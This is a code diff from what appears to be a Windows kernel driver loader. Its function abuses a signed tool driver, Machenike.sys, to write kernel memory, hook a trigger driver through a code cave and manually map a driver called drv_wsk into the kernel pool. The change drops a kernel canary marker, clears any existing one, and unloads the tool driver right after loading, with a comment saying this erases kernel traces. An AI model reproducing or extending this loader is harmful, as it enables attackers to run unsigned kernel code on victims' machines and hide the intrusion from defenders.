@@ -86,7 +86,8 @@ static bool LoadDrvWskViaPool(
             return true;
         }
     } else {
-        LOG_WARN("LoadDrvWskViaPool: Force reload enabled, bypassing canary check.");
+        LOG_WARN("LoadDrvWskViaPool: Force reload enabled, clearing existing kernel canary.");
+        ClearDriverCanary(hDev, cr3);
     }
 
     // ---- 4. 扫描触发驱动中的 default 分支 Hook 点与 Code Cave ----
@@ -236,17 +237,13 @@ static bool LoadDrvWskViaPool(
     }
     LOG_OK("LoadDrvWskViaPool: Phase 4 complete! DriverEntry executed successfully.");
 
-    // ---- 11. 阶段五：记录内核物理暗桩标记 ----
-    DRV_WSK_CANARY canary = {};
-    canary.Magic = DRV_WSK_CANARY_MAGIC;
-    canary.KernelImageVA = allocatedPoolVA;
-    canary.ImageSize = (uint32_t)img.SizeOfImage;
-
-    WriteKernelVA(hDev, cr3, triggerDrvBase + 0x28, &canary, sizeof(canary));
-    LOG_OK("LoadDrvWskViaPool: Kernel canary recorded into trigger driver (VA=0x%016llX, Size=0x%X)",
-           canary.KernelImageVA, canary.ImageSize);
-
     CloseHandle(hDev);
+    hDev = INVALID_HANDLE_VALUE;
+
+    // ---- 核心驱动一旦启动成功，立即卸载 Machenike.sys 抹除内核痕迹 ----
+    LOG_INFO("LoadDrvWskViaPool: Core driver running successfully, unloading Machenike.sys tool driver...");
+    UnloadWhqlDriver(L"Machenike");
+
     LOG_OK("LoadDrvWskViaPool: [ManualMap] Pipeline successfully completed! drv_wsk loaded into kernel pool.");
     return true;
 }
